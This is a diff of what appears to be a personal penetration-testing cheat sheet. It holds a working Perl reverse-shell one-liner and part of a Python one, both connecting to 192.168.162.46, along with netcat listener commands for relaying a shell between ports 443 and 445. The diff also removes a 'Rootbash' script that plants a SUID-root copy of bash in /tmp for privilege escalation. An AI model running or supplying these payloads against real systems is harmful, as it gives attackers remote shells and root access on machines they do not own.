@@ -41,16 +41,11 @@ s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.162.46",4
 EOF
 
 =================================== 
-Rootbash
-#!/usr/bin/env python
-import os
-import sys
-os.system('cp /bin/bash /tmp/rootbash; chown root:root /tmp/rootbash; chmod +s /tmp/rootbash')
-
-=================================== 
 Catch a dying shell 
 kali> vim perl.shell  
 perl -e 'use Socket;$i="192.168.162.46";$p=445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' 
 kali> cat perl.shell | nc -lnvp 443   ..listen on 443, re-send to 445 
 kali> nc -lvnp 445 
 
+===================================
+Consider: mxrootbash
